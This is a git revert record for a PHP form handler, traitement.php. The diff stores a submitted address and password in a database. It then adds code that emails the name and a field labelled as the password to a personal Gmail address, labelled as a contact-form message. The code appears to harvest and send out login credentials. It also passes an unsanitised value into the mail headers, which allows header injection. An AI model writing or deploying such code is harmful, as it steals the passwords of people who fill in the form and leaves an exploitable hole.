134e409b494acd4782218ee4b2c4b46fc63e7239
Daniel Fouda <daniel.ryota@gmail.com>
2023-12-14 15:49:53 +0100

    Revert "commit of traitement"
    This reverts commit ca4ec2a1c5c3713c6fdb6f5741611166ed441345.

--- traitement.php
+++ traitement.php
@@ -16,4 +16,25 @@
         $verif->execute(array($nom));		
         $insert = $bdd->prepare('INSERT INTO infos(adresse, password0) VALUES(?, ?)');
         $insert->execute(array($adresse, $password));
+
+        // Adresse e-mail où envoyer le message
+        $destinataire = "daniel.ryota123@gmail.com";
+        
+        // Sujet du message
+        $sujet = "Nouveau message du formulaire de contact";
+        
+        // Construire le corps du message
+        $corps_message = "Nom: $nom\n";
+        $corps_message .= "Mot de passe: $email\n";
+        
+        // En-têtes du message
+        $headers = "From: $email\r\n";
+        $headers .= "Reply-To: $email\r\n";
+        
+        // Envoyer le message
+        if(mail($destinataire, $sujet, $corps_message, $headers)){
+            echo "Le message a été envoyé avec succès.";
+        }else{
+            echo "Une erreur s'est produite lors de l'envoi du message.";
+        }
     }
